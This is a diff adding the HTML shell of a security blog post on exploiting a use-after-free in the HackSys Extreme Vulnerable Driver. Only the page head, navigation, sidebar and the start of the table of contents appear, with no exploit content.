@@ -1,0 +1,1389 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" />
+<link rel="icon" href="/favicon-dark.svg" type="image/svg+xml" media="(prefers-color-scheme: dark)" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie) – yoshl - IT enjoyer</title>
+  <meta name="description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain..." /><link rel="canonical" href="//localhost:1313/winint-compilation/winint-useafterfree/" itemprop="url" />
+
+<meta property="og:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)" />
+<meta property="og:description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain..." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/winint-compilation/winint-useafterfree/" /><meta property="article:section" content="winint-compilation" />
+
+
+
+  <meta itemprop="name" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)">
+  <meta itemprop="description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain...">
+  <meta itemprop="wordCount" content="3259">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)">
+  <meta name="twitter:description" content="Diving into Use-After-Free explotation in the famous HackSys Extreme Vulnerable Driver (HEVD) to gain access to execute a gadget in order to escalate the attack vector to a shellcode, ROP chain...">
+
+    <link href="/css/compiled/main.css" rel="stylesheet" />
+
+
+
+  <link href="/css/custom.css" rel="stylesheet" />
+
+
+  <script>
+     
+    const defaultTheme = 'system';
+
+    const setDarkTheme = () => {
+      document.documentElement.classList.add("dark");
+      document.documentElement.style.colorScheme = "dark";
+    }
+    const setLightTheme = () => {
+      document.documentElement.classList.remove("dark");
+      document.documentElement.style.colorScheme = "light";
+    }
+
+    if ("color-theme" in localStorage) {
+      localStorage.getItem("color-theme") === "dark" ? setDarkTheme() : setLightTheme();
+    } else {
+      defaultTheme === "dark" ? setDarkTheme() : setLightTheme();
+      if (defaultTheme === "system") {
+        window.matchMedia("(prefers-color-scheme: dark)").matches ? setDarkTheme() : setLightTheme();
+      }
+    }
+  </script>
+
+  
+</head>
+<body dir="ltr"><div class="nav-container hx-sticky hx-top-0 hx-z-20 hx-w-full hx-bg-transparent print:hx-hidden">
+  <div class="nav-container-blur hx-pointer-events-none hx-absolute hx-z-[-1] hx-h-full hx-w-full hx-bg-white dark:hx-bg-dark hx-shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] contrast-more:hx-shadow-[0_0_0_1px_#000] dark:hx-shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] contrast-more:dark:hx-shadow-[0_0_0_1px_#fff]"></div>
+
+  <nav class="hx-mx-auto hx-flex hx-items-center hx-justify-end hx-gap-2 hx-h-16 hx-px-6 hx-max-w-[90rem]">
+    <a class="hx-flex hx-items-center hover:hx-opacity-75 ltr:hx-mr-auto rtl:hx-ml-auto" href="/">
+        <span class="hx-mr-2 hx-font-extrabold hx-inline hx-select-none" title="yoshl - IT enjoyer">yoshl - IT enjoyer</span>
+    </a><div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+<button type="button" aria-label="Menu" class="hamburger-menu -hx-mr-2 hx-rounded hx-p-2 active:hx-bg-gray-400/20 md:hx-hidden"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx-mx-auto hx-flex max-w-full">
+    <div class="mobile-menu-overlay [transition:background-color_1.5s_ease] hx-fixed hx-inset-0 hx-z-10 hx-bg-black/80 dark:hx-bg-black/60 hx-hidden"></div>
+<aside class="sidebar-container hx-flex hx-flex-col print:hx-hidden md:hx-top-16 md:hx-shrink-0 md:hx-w-64 md:hx-self-start max-md:[transform:translate3d(0,-100%,0)] md:hx-hidden xl:hx-block">
+  
+  <div class="hx-px-4 hx-pt-4 md:hx-hidden">
+    <div class="search-wrapper hx-relative md:hx-w-64">
+  <div class="hx-relative hx-flex hx-items-center hx-text-gray-900 contrast-more:hx-text-gray-800 dark:hx-text-gray-300 contrast-more:dark:hx-text-gray-300">
+    <input
+      placeholder="Search..."
+      class="search-input hx-block hx-w-full hx-appearance-none hx-rounded-lg hx-px-3 hx-py-2 hx-transition-colors hx-text-base hx-leading-tight md:hx-text-sm hx-bg-black/[.05] dark:hx-bg-gray-50/10 focus:hx-bg-white dark:focus:hx-bg-dark placeholder:hx-text-gray-500 dark:placeholder:hx-text-gray-400 contrast-more:hx-border contrast-more:hx-border-current"
+      type="search"
+      value=""
+      spellcheck="false"
+    />
+    <kbd
+      class="hx-absolute hx-my-1.5 hx-select-none ltr:hx-right-1.5 rtl:hx-left-1.5 hx-h-5 hx-rounded hx-bg-white hx-px-1.5 hx-font-mono hx-text-[10px] hx-font-medium hx-text-gray-500 hx-border dark:hx-border-gray-100/20 dark:hx-bg-dark/50 contrast-more:hx-border-current contrast-more:hx-text-current contrast-more:dark:hx-border-current hx-items-center hx-gap-1 hx-transition-opacity hx-pointer-events-none hx-hidden sm:hx-flex"
+    >
+      CTRL K
+    </kbd>
+  </div>
+
+  <div>
+    <ul
+      class="search-results hextra-scrollbar hx-hidden hx-border hx-border-gray-200 hx-bg-white hx-text-gray-100 dark:hx-border-neutral-800 dark:hx-bg-neutral-900 hx-absolute hx-top-full hx-z-20 hx-mt-2 hx-overflow-auto hx-overscroll-contain hx-rounded-xl hx-py-2.5 hx-shadow-xl hx-max-h-[min(calc(50vh-11rem-env(safe-area-inset-bottom)),400px)] md:hx-max-h-[min(calc(100vh-5rem-env(safe-area-inset-bottom)),400px)] hx-inset-x-0 ltr:md:hx-left-auto rtl:md:hx-right-auto contrast-more:hx-border contrast-more:hx-border-gray-900 contrast-more:dark:hx-border-gray-50 hx-w-screen hx-min-h-[100px] hx-max-w-[min(calc(100vw-2rem),calc(100%+20rem))]"
+      style="transition: max-height 0.2s ease 0s;"
+    ></ul>
+  </div>
+</div>
+
+  </div>
+  <div class="hextra-scrollbar hx-overflow-y-auto hx-overflow-x-hidden hx-p-4 hx-grow md:hx-h-[calc(100vh-var(--navbar-height)-var(--menu-height))]">
+    <ul class="hx-flex hx-flex-col hx-gap-1 md:hx-hidden">
+      
+      
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/"
+    
+  >Chaos-Based-Encryption Saga
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-fundamentals/"
+    
+  >Pt 1 - Chaos Based Encryption applied to stegoanalysis
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-creation/"
+    
+  >Pt 2.1 - Creation your own Chaos System
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/cbe-blogs/cbe-decochators/"
+    
+  >Pt 2.2 - Decochators Pypi Package
+    </a>
+              
+            </li></ul>
+      </div></li>
+          <li class="open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/"
+    
+  >WinInt Compilation
+        <span class="hextra-sidebar-collapsible-button"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor" class="hx-h-[18px] hx-min-w-[18px] hx-rounded-sm hx-p-0.5 hover:hx-bg-gray-800/5 dark:hover:hx-bg-gray-100/5"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" class="hx-origin-center hx-transition-transform rtl:-hx-rotate-180"></path></svg></span>
+    </a><div class="ltr:hx-pr-0 hx-overflow-hidden">
+        <ul class='hx-relative hx-flex hx-flex-col hx-gap-1 before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] ltr:hx-ml-3 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-mr-3 rtl:hx-pr-3 rtl:before:hx-right-0 dark:before:hx-bg-neutral-800'><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-understading-processes/"
+    
+  >Elementary: Understanding Processes
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-arbitrarywrite/"
+    
+  >Arbritrary Write - HEVD (ft. Astharot15)
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col "><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/winint-compilation/winint-wfownership/"
+    
+  >Taking Back Control - Windows File Ownership
+    </a>
+              
+            </li><li class="hx-flex hx-flex-col open"><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      sidebar-active-item hx-bg-primary-100 hx-font-semibold hx-text-primary-800 contrast-more:hx-border contrast-more:hx-border-primary-500 dark:hx-bg-primary-400/10 dark:hx-text-primary-600 contrast-more:dark:hx-border-primary-500"
+    href="/winint-compilation/winint-useafterfree/"
+    
+  >Use-After-Free - HEVD (&#43; SMEP/KASLR/GS Cookie)
+    </a>
+  
+    <ul class='hx-flex hx-flex-col hx-gap-1 hx-relative before:hx-absolute before:hx-inset-y-1 before:hx-w-px before:hx-bg-gray-200 before:hx-content-[""] dark:before:hx-bg-neutral-800 ltr:hx-pl-3 ltr:before:hx-left-0 rtl:hx-pr-3 rtl:before:hx-right-0 ltr:hx-ml-3 rtl:hx-mr-3'><li>
+              <a
+                href="#introduction"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Introduction</a>
+            </li>
+          <li>
+              <a
+                href="#source-analysis"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Source Analysis</a>
+            </li>
+          <li>
+              <a
+                href="#initial-analysis"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Initial Analysis</a>
+            </li>
+          <li>
+              <a
+                href="#flow-hijacking"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Flow Hijacking</a>
+            </li>
+          <li>
+              <a
+                href="#conclusion"
+                class="hx-flex hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [word-break:break-word] hx-cursor-pointer [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] contrast-more:hx-border hx-gap-2 before:hx-opacity-25 before:hx-content-['#'] hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:hx-text-gray-900 contrast-more:dark:hx-text-gray-50 contrast-more:hx-border-transparent contrast-more:hover:hx-border-gray-900 contrast-more:dark:hover:hx-border-gray-50"
+              >Conclusion</a>
+            </li>
+          </ul>
+  
+              
+            </li></ul>
+      </div></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/vm-reversing/"
+    
+  >Virtual Machine (Reversing x86)
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/manuallyupx/"
+    
+  >Manually Unpacking UPX | PE &amp; PE&#43; (x86/x64 Tips)
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/why2025-ctf/"
+    
+  >WHY2025 CTF | Full Forensics &#43; Reversing Bonus
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/l3akctf-2025/"
+    
+  >L3akCTF 2025 (Post Mortem) | Full Forensics
+    </a></li>
+          <li class=""><a
+    class="hx-flex hx-items-center hx-justify-between hx-gap-2 hx-cursor-pointer hx-rounded hx-px-2 hx-py-1.5 hx-text-sm hx-transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] [word-break:break-word]
+      hx-text-gray-500 hover:hx-bg-gray-100 hover:hx-text-gray-900 contrast-more:hx-border contrast-more:hx-border-transparent contrast-more:hx-text-gray-900 contrast-more:hover:hx-border-gray-900 dark:hx-text-neutral-400 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50 contrast-more:dark:hx-text-gray-50 contrast-more:dark:hover:hx-border-gray-50"
+    href="/tjctf-2025/"
+    
+  >TJCTF 2025 | 7/8 Forensics
+    </a></li>
+    </ul>
+
+    <div class="max-xl:hx-hidden hx-h-0 hx-w-64 hx-shrink-0"></div></div>
+  
+  
+    <div class="md:hx-hidden  hx-sticky hx-bottom-0 hx-bg-white dark:hx-bg-dark hx-mx-4 hx-py-4 hx-shadow-[0_-12px_16px_#fff] hx-flex hx-items-center hx-gap-2 dark:hx-border-neutral-800 dark:hx-shadow-[0_-12px_16px_#111] contrast-more:hx-border-neutral-400 contrast-more:hx-shadow-none contrast-more:dark:hx-shadow-none hx-border-t" data-toggle-animation="show"><div class="hx-flex hx-grow hx-flex-col"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div></div></aside>
+    
+<nav class="hextra-toc hx-order-last hx-hidden hx-w-64 hx-shrink-0 xl:hx-block print:hx-hidden hx-px-4" aria-label="table of contents">
+    <div class="hextra-scrollbar hx-sticky hx-top-16 hx-overflow-y-auto hx-pr-4 hx-pt-6 hx-text-sm [hyphens:auto] hx-max-h-[calc(100vh-var(--navbar-height)-env(safe-area-inset-bottom))] ltr:hx--mr-4 rtl:hx--ml-4"><p class="hx-mb-4 hx-font-semibold hx-tracking-tight">On this page</p><ul>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#introduction">Introduction
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#environment">Environment
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="hx-font-semibold hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#source-analysis">Source Analysis
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
+        <a class="ltr:hx-pl-4 rtl:hx-pr-4 hx-inline-block hx-text-gray-500 hover:hx-text-gray-900 dark:hx-text-gray-400 dark:hover:hx-text-gray-300 contrast-more:hx-text-gray-900 contrast-more:hx-underline contrast-more:dark:hx-text-gray-50 hx-w-full hx-break-words" href="#struct-review">Struct review
+        </a>
+      </li>
+      <li class="hx-my-2 hx-scroll-my-6 hx-scroll-py-6">
